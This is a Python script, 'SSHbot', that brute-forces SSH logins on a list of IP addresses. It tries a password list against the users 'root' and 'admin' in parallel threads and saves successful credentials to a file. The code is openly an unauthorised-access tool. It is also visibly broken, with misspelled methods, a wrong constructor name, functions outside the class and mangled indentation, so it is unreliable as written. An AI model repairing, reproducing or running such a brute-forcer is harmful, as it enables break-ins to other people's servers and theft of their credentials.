#importing all essentials

import paramiko
import time 
import threading
import sys 
import socket 


class SSHbot:
	bruted = 0
	username_list = ['root', 'admin']
	ip_list = []
	password_list = []
	port = 22 #will change later

	def __ini__(self):
		# ssh password list
		with open('ssh_password_list.txt', 'r') as f:
			for line in f.readline():
			    password = line.strip('\n')
			    self.password_list.append(password)

		# new ssh ip list
		with open('grepy_ips_new.txt', 'r') as fp:
			for line in fp.readline():
				ip = line.strip('\n')
				self.ip_list.append(ip)


def write(self, ip, user, password):
	with open('SSH_logins.txt', 'a') as f:
		f.write(f'[IP]{IP} [USER]{user} [PASSWORD]{password}\n')

def ssh_connect(self, ip, use , password, code=0):
	#creating the actual session to the ssh
	ssh = paramiko.SSHClient()
	#setting the police to use when connecting to the ssh with a unknown host key
	ssh.set_misisng_host_key_policy(paramiko.AutoAddPolicy())
	try:
		#connecting tyo the ssh/ftp server using ip, port, username, password
		ssh.connect(ip, self.port. user, password, banner_timeout=30, allow_agent=False, look_for_key=False)
	except paramiko.AuthenticationException:
		# Auth Failed
		code = 1
	except paramiko.SSHException:
		#ssh failing
		code = 2
	except socket.error as e:
		#connection failed
		code = 3

		ssh.close()
		return code

def run (self):
	for ip in self.ip_list:
		t1 = threading.Thread(target=self.main, args=(ip,))
		t1.start()

def main(self, ip):
	found = false
	for user in self.username_list:
		if found:
			break
		for password in self.password_list:
		    try: 
			    response = self.ssh_connect(ip, user, password)

			    if response == 0:
			#if password is not equal to below string, than a error will occur and it will give a false pos
	               if password == "abcdefghijklmnopqrstuvpksisjdiad9238ue398j9jlsuihaiaushfl9w8yh948tujsh":
	            	   print(f'[*] Connection is giving false auth: {ip}')
	            	   found = true
	            	   break
                print(f'\t[*] {ip} [*] {user} [*] Pass: {password} -> Login Correct *** <=')
                self.write(ip, user, password)
                elif response == 1:
                print(f'\t[*] {ip} [*] {user} [*] Pass: {password} -> Login Incorrect *** <=')
                found = true 
             elif response == 2;
                print(f'[*] SSH Failed to address: {ip}')
             elif response == 3:
                print(f'[*] Connection could not be established to address: {ip}')
                found = true
                break
                except Exception as e:
                print(e)
                pass



  if __name__=='__main__':
  try:
  s = SSHbot()
  s.run()
  except:
  pass 



